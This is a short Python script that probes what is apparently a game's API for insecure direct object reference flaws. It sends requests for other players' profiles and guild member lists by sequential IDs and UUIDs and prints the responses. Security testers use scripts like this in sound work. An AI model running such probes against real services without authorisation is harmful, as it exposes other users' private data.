#!/usr/bin/env python3
"""Test IDOR on player/profile endpoints."""
import json, sys, os, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import ws_bridge

ws_bridge.start(port=55004)

# Try accessing other players' data
tests = [
    ("/api/players/1", "GET", None),
    ("/api/players/2", "GET", None),
    ("/api/players/27de1bb9-227b-4aaa-b847-08990f537fa1", "GET", None),
    ("/api/players/00000000-0000-0000-0000-000000000000", "GET", None),
    ("/api/guilds/1/members", "GET", None),
    ("/api/guilds/2/members", "GET", None),
    ("/api/guilds/10013/members", "GET", None),
]

for path, method, body in tests:
    print(f"=== {method} {path} ===")
    res = ws_bridge.request(method, path, body, timeout=15)
    print(f"  status: {res.get('status')}")
    print(f"  data: {json.dumps(res.get('data'), ensure_ascii=False)[:200]}")
    print()
    time.sleep(0.5)
